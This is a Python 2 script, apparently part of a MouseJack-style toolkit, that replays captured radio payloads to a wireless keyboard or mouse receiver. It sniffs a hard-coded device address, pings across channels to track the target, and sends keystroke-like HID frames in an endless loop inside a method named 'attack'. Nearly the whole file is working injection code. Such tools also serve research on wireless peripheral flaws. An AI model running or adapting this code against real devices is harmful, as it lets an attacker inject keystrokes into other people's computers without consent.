#!/usr/bin/env python2
'''
Author: xswxm
Blog: xswxm.com

This script is used to replay payloads.
Codes is ported from 'utils/player.py'

'''
import time
from lib import common
common.init_args('./app.py')
common.parse_and_init()

from array import array
class Replay:
  # Constructor
  def __init__(self, address=None, payloads=[]):
    self.address = address
    self.payloads = payloads
    self.last_ping = time.time()
    self.channel = common.channels[0]
    self.channels = []

  # Setup device
  def setup(self):
    # Parse the prefix address
    prefix_address = self.address.replace(':', '').decode('hex')[::-1][:5]
    # Put the radio in sniffer mode (ESB w/o auto ACKs)
    common.radio.enter_sniffer_mode(prefix_address)

  # Ping address in diff channels
  def ping(self):
    success = True
    # Follow the target device if it changes channels
    if time.time() - self.last_ping > common.timeout:
      # First try pinging on the active channel
      if not common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
        # Ping failed on the active channel, so sweep through all available channels
        success = False
        channels = common.channels[:]
        for channel in self.channels:
          channels.remove(channel)
          common.radio.set_channel(channel)
          if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
            # Ping successful, exit out of the ping sweep
            self.last_ping = time.time()
            success = True
            break
        else:
          for channel in channels:
            common.radio.set_channel(channel)
            if common.radio.transmit_payload(common.ping_payload, common.ack_timeout, common.retries):
              # Add new channel to channels
              self.channels.append(channel)
              # Ping successful, exit out of the ping sweep
              self.last_ping = time.time()
              success = True
              self.channel = channel
              break
      # Ping succeeded on the active channel
      else:
        self.last_ping = time.time()
    return success

  # Launch attacks or send payloads
  def attack(self):
    # Send payload if ping was successful
    if self.ping():
      for payload in self.payloads:
        print '{0:<8}{1}'.format(self.channel, payload)
        # Send the payload
        common.radio.transmit_payload(payload.replace(':', '').decode('hex'))
        time.sleep(0.025)


address = '29:A7:95:CC:09'
payloads = []
payload = '00:C1:00:04:00:00:00:00:00:3B'
payloads.append(payload)
payload = '00:C1:00:00:00:00:00:00:00:3F'
payloads.append(payload)

# payload = '00:C2:00:00:00:00:00:00:00:3E'
# payloads.append(payload)
# payload = '00:4F:00:00:6E:00:00:00:00:43'
# payloads.append(payload)
# payload = '00:51:07:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:A8'
# payloads.append(payload)
# 00:51:09:00:09:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:9D
# 00:51:09:00:10:02:00:42:00:00:00:00:00:00:00:00:00:00:00:00:00:52
# 00:51:09:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:A6
# 00:51:09:04:02:5A:05:00:00:00:00:00:00:00:00:00:00:00:00:00:00:41
# payload = '00:C2:02:00:00:00:00:00:00:3C'
# payloads.append(payload)
# payload = '00:4F:00:00:6E:00:00:00:00:43'
# payloads.append(payload)
replay = Replay(address, payloads)
while True:
  replay.attack()
